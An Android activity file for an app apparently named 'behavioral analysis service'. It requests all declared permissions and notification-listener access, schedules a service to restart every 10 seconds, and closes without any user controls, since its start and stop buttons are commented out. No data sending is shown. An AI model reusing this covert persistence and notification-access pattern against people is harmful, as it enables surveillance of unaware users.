package com.behavioralanalysis.service;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.Settings;
import android.view.View;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;
import java.util.TimerTask;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (checkPermissionAndRequest()) {
            Intent intent = new Intent(this, MainService.class);
            PendingIntent pendingIntent = PendingIntent.getService(getApplicationContext(), 1, intent, 0);
            AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
            alarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, 0, 10000, pendingIntent);
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        }
        finish();
    }
/*
    public void startService() {
        if (checkPermissionAndRequest()) {
            Intent serviceIntent = new Intent(this, MainService.class);
            PendingIntent pendingIntent = PendingIntent.getService(getApplicationContext(), 1, serviceIntent, 0);
            AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
            alarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, 0, 1000, pendingIntent);
            ContextCompat.startForegroundService(this, serviceIntent);
            refreshButtons(true);
        }
    }

    public void stopService() {
            Intent serviceIntent = new Intent(this, MainService.class);
            serviceIntent.setAction("STOP");
            stopService(serviceIntent);
            refreshButtons(false);
    }

    public void startServiceClick(View v) {
        startService();
    }

    public void stopServiceClick(View v) {
        stopService();
    }

    private void refreshButtons(boolean isServiceRunning) {
        View startButton = findViewById(R.id.startService);
        View stopButton = findViewById(R.id.stopService);

        startButton.setEnabled(!isServiceRunning);
        stopButton.setEnabled(isServiceRunning);
    }
    */

    private boolean checkPermissionAndRequest() {
        PackageInfo packageInfo = null;
        String[] permissions = new String[]{};
        Context context = getApplicationContext();
        try {
            packageInfo = getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_PERMISSIONS);
            permissions = packageInfo.requestedPermissions;
        } catch (PackageManager.NameNotFoundException ex) {
            ex.printStackTrace();
        }

        List<String> neededPermissions = new ArrayList<>();
        for (String permission : permissions) {
            int status = ContextCompat.checkSelfPermission(this, permission);
            if (status != PackageManager.PERMISSION_GRANTED) {
                neededPermissions.add(permission);
            }
        }

        if (!neededPermissions.isEmpty()) {
            Toast.makeText(
                    this,
                    "Для работы приложения необходимо предоставить разрешения",
                    Toast.LENGTH_LONG
            ).show();

            ActivityCompat.requestPermissions(
                    this,
                    neededPermissions.toArray(new String[neededPermissions.size()]),
                    0
            );
            return false;
        }

        ContentResolver contentResolver = getContentResolver();
        String enabledNotificationListeners =
                Settings.Secure.getString(contentResolver, "enabled_notification_listeners");
        String packageName = getPackageName();
        if (enabledNotificationListeners == null ||
                !enabledNotificationListeners.contains(packageName)) {
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            return false;
        }

        return true;
    }
}
